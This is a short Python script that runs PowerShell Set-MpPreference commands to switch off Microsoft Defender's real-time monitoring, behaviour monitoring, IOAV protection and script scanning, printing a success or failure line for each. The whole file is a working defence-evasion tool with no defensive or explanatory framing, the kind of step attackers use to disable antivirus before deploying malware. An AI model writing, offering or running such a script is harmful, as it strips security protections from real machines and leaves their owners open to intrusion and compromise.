import subprocess

# List of PowerShell commands to disable Defender protections
commands = [
    'Set-MpPreference -DisableRealtimeMonitoring $true',
    'Set-MpPreference -DisableBehaviorMonitoring $true',
    'Set-MpPreference -DisableIOAVProtection $true',
    'Set-MpPreference -DisableScriptScanning $true'
]

for cmd in commands:
    full_cmd = ['powershell', '-Command', cmd]
    try:
        subprocess.run(full_cmd, check=True)
        print(f"[+] Successfully ran: {cmd}")
    except subprocess.CalledProcessError:
        print(f"[-] Failed to run: {cmd}. Are you running as administrator?")
